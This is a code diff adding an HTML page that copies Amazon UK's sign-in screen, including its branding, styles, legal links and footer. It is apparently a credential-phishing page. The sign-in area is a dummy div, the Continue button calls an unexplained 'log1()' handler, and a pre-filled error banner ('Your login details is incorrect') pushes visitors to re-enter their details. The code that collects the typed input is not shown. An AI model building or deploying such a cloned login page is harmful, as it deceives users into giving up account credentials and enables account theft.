@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="en-GB" class="a-no-js" data-19ax5a9jf="dingo">
+
+<head>
+    <script>window.ue && ue.count && ue.count('CSMLibrarySize', 10163)</script>
+    <script>var aPageStart = (new Date()).getTime();</script>
+    <meta charset="utf-8" />
+
+    <title dir="ltr">Amazon Sign In</title>
+
+    <style>
+        body {
+            font-family: Amazon Ember !important;
+        }
+
+        /* ******** */
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-weight: 200;
+            src: url(https://m.media-amazon.com/images/S/sash/Dv1WQ5DdeMS5qP7.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/e0LnMbFWJC-TMQz.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-weight: 200;
+            font-style: italic;
+            src: url(https://m.media-amazon.com/images/S/sash/ozb5-CLHQWI6Soc.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/twzZHebXjCHBb6v.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            src: url(https://m.media-amazon.com/images/S/sash/pDxWAF1pBB0dzGB.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/kfKKBuoqcD$AUKL.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-style: italic;
+            src: url(https://m.media-amazon.com/images/S/sash/WOnTLzkiaEccV7F.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/JJsp0ZvgpfwzJM6.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-weight: 500;
+            src: url(https://m.media-amazon.com/images/S/sash/VjTR4RqBzY0mUYx.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/XIvhNCZAsrT80Wz.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-weight: 500;
+            font-style: italic;
+            src: url(https://m.media-amazon.com/images/S/sash/KwhNPG8Jz-Vz2X7.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/YAEPfuhs1l-argd.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-weight: 700;
+            src: url(https://m.media-amazon.com/images/S/sash/KFPk-9IF4FqAqY-.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/mzVbGSgvdBfRLX9.woff) format("woff")
+        }
+
+        @font-face {
+            font-family: 'Amazon Ember';
+            font-style: italic;
+            font-weight: 700;
+            src: url(https://m.media-amazon.com/images/S/sash/2SazJx$EeTHfhMN.woff2) format("woff2"), url(https://m.media-amazon.com/images/S/sash/CjbL$jCCegyfqZ7.woff) format("woff")
+        }
+
+        .a-ember body {
+            font-family: "Amazon Ember", Arial, sans-serif !important
+        }
+
+        .a-ember .a-text-quote {
+            font-family: "Amazon Ember", Arial, sans-serif !important
+        }
+
+        h1 h2 h3 h4 h5 h6 {
+            font-family: "Amazon Ember", Arial, sans-serif !important
+        }
+    </style>
+
+    <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/11EIQ5IGqaL._RC|01ZTHTZObnL.css,519YvOBDG8L.css,31uBZQYbDJL.css,11j2+ObrspL.css,01qPl4hxayL.css,01pOTCa2wPL.css,413Vvv3GONL.css,11TIuySqr6L.css,01Rw4F+QU6L.css,11JJsNcqOIL.css,01J3raiFJrL.css,01IdKcBuAdL.css,01dRHIoUjnL.css,21lFcV0hmCL.css,01Sv7-fQIGL.css,51Rl5O14c6L.css,01XPHJk60-L.css,11SB0yVuJJL.css,01ANX9Vx1mL.css,01TDvYqAR5L.css,21+W7u4fDzL.css,11wazUu-8nL.css,21RWaJb6t+L.css,11yLJpkAxFL.css,21lGqyrfUAL.css,01CFUgsA-YL.css,31y6-H8YMuL.css,116t+WD27UL.css,111bsezNMhL.css,113QjYEJj-L.css,11msBd9oOTL.css,01mrXYDnN4L.css,01X+Gu6WK9L.css,21ZVss5T32L.css,11HRQgqJi3L.css,01LzHhtXxxL.css,21zi3R-XjNL.css,11pY6eEjpmL.css,11hvENnYNUL.css,11Qek6G6pNL.css,01890+Vwk8L.css,014VAMpg+ZL.css,01qiwJ7qDfL.css,21TAMzcrOKL.css,01tkNT3LUNL.css,01WslS8q5ML.css,21qx+RW81IL.css,013-xYw+SRL.css_.css?AUIClients/AmazonUI#gb.not-trident" />
+    <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51szCuYToeL.css_.css?AUIClients/AuthenticationPortalAssets" />
+    <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/21cwI2AAWQL.css?AUIClients/CVFAssets" />
+
+    <script type="a-state"
+        data-a-state="{&quot;key&quot;:&quot;sif-encryption-profile&quot;}">{"sifProfile":"AuthenticationPortalSigninEU"}</script>
+    <script type="text/javascript" async
+        src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninEU.js"></script>
+</head>
+
+<body
+    class="ap-locale-en_GB a-m-us a-aui_72554-c a-aui_a11y_6_837773-c a-aui_killswitch_csa_logger_372963-t1 a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c">
+    <div id="a-page">
+        <script type="a-state"
+            data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_KILLSWITCH_CSA_LOGGER_372963":"T1"}</script>
+        <div class="a-section a-padding-medium auth-workflow">
+            <div class="a-section a-spacing-none auth-navbar">
+                <div class="a-section a-spacing-medium a-text-center"> <a aria-label="www.amazon.co.uk"
+                        class="a-link-nav-icon" href="/ref=ap_frn_logo"> <i class="a-icon a-icon-logo"
+                            role="presentation"></i> <i class="a-icon a-icon-domain-uk a-icon-domain"
+                            role="presentation"></i> </a> </div>
+            </div>
+            <div id="authportal-center-section" class="a-section">
+                <div id="authportal-main-section" class="a-section">
+                    <div class="a-section a-spacing-base auth-pagelet-container">
+                        <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite"
+                            aria-atomic="true">
+                            <div class="a-box-inner a-alert-container">
+                                <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i
+                                    class="a-icon a-icon-alert"></i>
+                                <div class="a-alert-content">
+                                    <p> <a class="a-link-normal"
+                                            href="/gp/help/customer/display.html/ref=ap_cookie_error_help?"> </a> </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="a-section auth-pagelet-container">
+                        <div class="a-section a-spacing-base">
+                            <div class="a-section">
+                                <div name="signIn" method="post" novalidate action="https://www.amazon.co.uk/ap/signin"
+                                    class="auth-validate-form auth-real-time-validation a-spacing-none">
+
+                                    <!-- Error Alert -->
+                                    <div class="a-section a-spacing-base auth-pagelet-container">
+                                        <div class="a-section">
+                                            <div aria-live="assertive" id="auth-error-message-box"
+                                                class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
+                                                role="alert">
+                                                <div class="a-box-inner a-alert-container">
+                                                    <h4 class="a-alert-heading">There was a problem</h4><i
+                                                        class="a-icon a-icon-alert"></i>
+                                                    <div class="a-alert-content">
+                                                        Your login details is incorrect. Please check and try again.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="a-section">
+                                        <div class="a-box">
+                                            <div class="a-box-inner a-padding-extra-large">
+
+                                                <h1 class="a-spacing-small"> Sign in </h1>
+                                                <div class="a-row a-spacing-base"> <label for="ap_email"
+                                                        class="a-form-label"> Email or mobile phone number </label>
+                                                    <input type="email" maxlength="128" id="user-em"
+                                                        autocomplete="username" spellcheck="false"
+                                                        class="a-input-text a-span12 auth-autofocus auth-required-field auth-require-claim-validation"
+                                                        aria-required="true" />
+
+                                                    <input type="password" maxlength="1024"
+                                                        id="ap-credential-autofill-hint" name="password"
+                                                        spellcheck="false" class="a-input-text hide"
+                                                        aria-required="true" />
+
+                                                    <div id="auth-email-missing-alert"
+                                                        class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
+                                                        role="alert">
+                                                        <div class="a-box-inner a-alert-container"><i
+                                                                class="a-icon a-icon-alert"></i>
+                                                            <div class="a-alert-content"> Enter your e-mail address or
+                                                                mobile phone number </div>
+                                                        </div>
+                                                    </div>
+
+                                                    <div id="auth-email-invalid-claim-alert"
+                                                        class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
+                                                        role="alert">
+                                                        <div class="a-box-inner a-alert-container"><i
+                                                                class="a-icon a-icon-alert"></i>
+                                                            <div class="a-alert-content"> Wrong or Invalid e-mail
+                                                                address or mobile phone number. Please correct and try
+                                                                again. </div>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+
+                                                <div class="a-section">
+                                                    <span role="button" onclick="log1()"
+                                                        class="a-button a-button-span12 a-button-primary">
+                                                        <span class="a-button-inner">
+                                                            <input id="continue" aria-describedby="legalTextRow"
+                                                                class="a-button-input" type="submit"
+                                                                aria-labelledby="continue-announce" />
+                                                            <span id="continue-announce" class="a-button-text"
+                                                                aria-hidden="true"> Continue </span>
+                                                        </span>
+                                                    </span>
+
+                                                    <div id="legalTextRow"
+                                                        class="a-row a-spacing-top-medium a-size-small"> By continuing,
+                                                        you agree to Amazon's <a
+                                                            href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=1040616">Conditions
+                                                            of Use &amp; Sale</a>. Please see our <a
+                                                            href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=502584">Privacy
+                                                            Notice</a>, our <a
+                                                            href="/gp/help/customer/display.html/?nodeId=201890250">Cookies
+                                                            Notice</a> and our <a
+                                                            href="/gp/help/customer/display.html?nodeId=201909150">Interest-Based
+                                                            Ads Notice</a>. </div>
+                                                    <script> function cf() { if (typeof window.uet === 'function') { uet('cf'); } if (window.embedNotification && typeof window.embedNotification.onCF === 'function') { embedNotification.onCF(); } } </script>
+                                                    <script type="text/javascript">cf()</script>
+                                                </div>
+                                                <div id="ab-signin-link-section" class="a-section">
+                                                    <hr aria-hidden="true" class="a-divider-normal" />
+                                                    <div class="a-section a-spacing-micro"> <span class="a-text-bold">
+                                                            Buying for work? </span> </div> <a
+                                                        id="ab-signin-ingress-link" class="a-link-normal"
+                                                        href="https://www.amazon.co.uk/business/register/welcome?ref_=ab_reg_signin">
+                                                        <span> Shop on Amazon Business </span> </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="a-divider a-divider-break">
+                                <h5 aria-level="5">New to Amazon?</h5>
+                            </div> <span id="auth-create-account-link"
+                                class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a
+                                        id="createAccountSubmit" href="#" disabled class="a-button-text"> Create your
+                                        Amazon account </a></span></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="right-2"> </div>
+            <div class="a-section a-spacing-top-extra-large auth-footer">
+                <div class="a-divider a-divider-section">
+                    <div class="a-divider-inner"></div>
+                </div>
+                <div class="a-section a-spacing-small a-text-center a-size-mini"> <span
+                        class="auth-footer-seperator"></span>
+                    <ul>
+                        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a
+                                class="a-link-normal a-nowrap" target="_blank" rel="noopener"
+                                href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=1040616">
+                                Conditions of Use </a> <span class="auth-footer-seperator"></span> </li>
+                        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a
+                                class="a-link-normal a-nowrap" target="_blank" rel="noopener"
+                                href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=502584">
+                                Privacy Notice </a> <span class="auth-footer-seperator"></span> </li>
+                        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a
+                                class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/help"> Help </a>
+                            <span class="auth-footer-seperator"></span>
+                        </li>
+                        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a
+                                class="a-link-normal a-nowrap" target="_blank" rel="noopener"
+                                href="/gp/help/customer/display.html/?nodeId=201890250"> Cookies Notice </a> <span
+                                class="auth-footer-seperator"></span> </li>
+                        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a
+                                class="a-link-normal a-nowrap" target="_blank" rel="noopener"
+                                href="/gp/help/customer/display.html/?nodeId=201909150"> Interest-Based Ads Notice </a>
+                            <span class="auth-footer-seperator"></span>
+                        </li>
+                    </ul>
+                </div>
+                <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> &copy;
+                        1996-2025, Amazon.com, Inc. or its affiliates </span> </div>
+            </div>
+        </div>
+    </div>
+    <div id='be' style="display:none;visibility:hidden;">
+        <form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form>
+    </div> <noscript> <img height="1" width="1" style='display:none;visibility:hidden;'
+            src='//fls-eu.amazon.com/1/batch/1/OP/A1F83G8C2ARO7P:260-3026589-1539513:MJBBVJTZ38JC75QGVKTS$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DMJBBVJTZ38JC75QGVKTS:0'
+            alt="" /> </noscript>
+    <script>window.ue && ue.count && ue.count('CSMLibrarySize', 49424)</script>
+</body>
+
+</html>
